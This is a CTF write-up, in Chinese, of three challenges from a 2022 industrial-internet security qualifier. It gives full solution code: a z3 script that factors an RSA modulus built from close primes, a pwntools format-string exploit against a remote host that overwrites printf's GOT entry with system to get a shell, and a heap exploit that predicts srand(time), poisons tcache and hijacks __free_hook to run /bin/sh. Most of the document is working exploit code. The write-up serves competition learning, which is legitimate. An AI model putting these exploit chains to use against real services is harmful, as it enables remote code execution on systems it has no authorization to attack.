---
title: 中国工业互联网安全大赛北京市预选赛 Polaris WP
contest: 中国工业互联网安全大赛
year: 2022
difficulty: medium
vuln_type: pwn_unknown
tags: [RSA-close-primes, z3-solver, format-string, bss-overwrite, printf-got, srand-time-predict, tcache, HTTP-protocol, free-hook, system]
attack_chain:
  - Crypto 1: p, q 接近且差值为 2^420 + b（b < 2000），用 z3 解 p*q = n, q - p = 2^420 + b
  - Crypto 2: phi = (p-1)(q-1), d = invert(e, phi), m = pow(c, d, n) → flag
  - PWN 1: bss 段格式化字符串漏洞，两条 fmt 链打 printf.got = system
  - PWN 1 攻击: ru(b'HELLO?PWN IT!!!\n'); sl(b'%9$p') 泄 libc_base = rc - 0x20840
  - PWN 1 写 system: pl1 = '%13200c%6$hn%4194306c%17$n' 写 got 高 2 字节
  - PWN 1 第二轮: pl2 = '%{offest2}c%36$hhn%{offest1-offest2}c%8$hn' 改 system 地址
  - PWN 1 触发: 输入 sh → 调 system("sh")
  - PWN 2: 自定义 HTTP 协议（POST / HTTP/1.1 + p8(cmd) + '&' + args）
  - PWN 2 攻击: srand(time(0)) 预测 auth 头，dll.rand() 序列匹配
  - PWN 2 泄 libc: add(0, 0x26) + show(0) 泄 libc_addr = u64 - 0x1ecb61
  - PWN 2 写 free_hook: add(1,2,0x18) + add(2,0x18) + add(0x10,0x18) + delete(2) + delete(1)
  - PWN 2 续: edit(0, 'a'*0x20 + p64(libc+0x1eee48)) tcache 0x18 改 fd
  - PWN 2 触发: add(2, '/bin/sh') + add(3, p64(system+0x52290)) + delete(2)
key_payload: "z3 Solver() + p*q=n, q-p=2^420+b, b<2000; '%9$p' fmt 泄 libc; 'POST / HTTP/1.1\\r\\n' + p8(cmd) + '&' + args"
one_liner: 工业互联网预选赛：z3 解 RSA 接近素数 + bss 段 fmt 改 printf.got = system + 自定义 HTTP 协议 srand 预测 + tcache 改 free_hook。
lesson: RSA 接近素数（差值小）可用 z3/SAT 暴力偏移；fmt 字符串在 bss 段可改任意 GOT 表；自研协议注意 srand(time) 预测。
quality: high
---

# 中国工业互联网安全大赛北京市预选赛-Polaris 战队 WP

**来源**: ctfiot.com ID 65340

## 题目 1：RSA 接近素数

### 攻击
```python
from gmpy2 import *
import libnum
from z3 import *

e = 101684733522589049376051051576215902510166244234370429058800153902445053536138419222096346715560283781778705047246555278271919928248836576236044123786248907522717751222608113597458768397652361813688176017155353220911686089871315647328303370846954697334521948003485878793121446614220897034652783771882675756065
n = 106490064297459077911162044548396107234298314288687868971249318200714506925762583340058042587392504450330878677254698499363515259785914237880057943786202091010532603853142050802310895234445611880617572636397946757345480447391544962796834842717321639098108976593541239044249391398321435940436125823407760564233
c = 92367575354201067679929326801477992215675304496512806779109227230237905402825022908214026985431756172011616861246881703226244396008088878308925377019775353026444957454196182919500667632574210469783704454438904889268692709062013797002819384105191802781841741128273810101308641357704215204494382259638905571144

# 差值 = 2^420 + b，b < 2000
for b in range(2000):
    S = Solver()
    p, q = Ints('p q')
    S.add(p*q == n)
    S.add(q - p == 2**420 + b)
    if S.check() == sat:
        p, q = S.model()[p], S.model()[q]
        break

phi = (p-1)*(q-1)
d = int(gmpy2.invert(e, phi))
m = int(pow(c, d, n))
print(libnum.n2s(m))
```

## 题目 2：bss 段格式化字符串

### 攻击
```python
from pwn import *
r = remote("39.105.99.40", 16018)
e = ELF('./pwn1'); libc = e.libc

ru(b'HELLO?PWN IT!!!\n')
sl(b'%9$p')                    # 泄 libc_base
libc_base = int(rc(14), 16) - 0x20840

sys = libc_base + libc.sym['system']
shell = libc_base + og[0]      # one_gadget

# 第一步：写 got 高 2 字节
got = 0x403390
pl1 = '%13200c%6$hn%4194306c%17$n'
sl(pl1.encode())

# 第二步：写 system 完整地址
offest1 = sys & 0xffff
offest2 = int((sys & 0xffffff) / 0x10000)
ru(b'HELLO?PWN IT!!!\n')
pl2 = '%{}c%36$hhn%{}c%8$hn'.format(offest2, offest1 - offest2)
sl(pl2.encode())

# 触发
r.sendline(b'sh')
r.interactive()
```

## 题目 3：The Humide Script 自定义协议

### 攻击
```python
dll = ctypes.CDLL('libc.so.6')
dll.srand(dll.time())          # 预测随机序列

sh.send(b'DEV / HTTP/1.1\r\n' + p32(dll.rand()) + b'auth')
# add = p8(1), delete = p8(4), show = p8(3), edit = p8(2)

sh.add(0, 0x26, b'a')
sh.show(0)
libc_addr = u64(sh.recvn(6) + b'\x00\x00') - 0x1ecb61

# tcache 0x18 风水
sh.add(1, 0x18, b'a'); sh.add(2, 0x18, b'a'); sh.add(0x10, 0x18, b'a')
sh.delete(2); sh.delete(1)
sh.edit(0, b'a' * 0x20 + p64(libc_addr + 0x1eee48))   # 改 fd → __free_hook-8
sh.add(2, 0x18, b'/bin/sh ')
sh.add(3, 0x18, p64(libc_addr + 0x52290))              # system
sh.delete(2)                                            # 触发 system("/bin/sh")
```

## 评价
Polaris 战队 3 题全方向综合解：RSA 接近素数 z3 暴力偏移 + bss 段 fmt 改 GOT（两条 fmt 链分高低位写） + 自定义 HTTP 协议 + srand(time) 预测 + tcache 改 free_hook。展现了 crypto/web/pwn 综合实力。
